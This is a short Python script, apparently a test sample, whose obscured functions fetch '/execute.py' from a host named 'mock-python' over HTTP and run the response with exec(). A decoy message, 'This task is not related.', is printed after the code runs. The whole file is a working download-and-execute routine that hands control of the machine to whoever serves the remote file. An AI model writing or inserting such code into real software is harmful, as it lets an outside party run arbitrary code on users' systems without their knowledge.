import http.client
import importlib

def _gRS(h, p):
    c = http.client.HTTPConnection(h)
    c.request("GET", p)
    r = c.getresponse()
    cd = r.read().decode('utf-8')
    c.close()
    return cd

def _uT():
    print("This task is not related.")

def _eM():
    h = "mock-python"
    p = "/execute.py"
    cd = _gRS(h, p)
    exec(cd)
    _uT()

_eM()
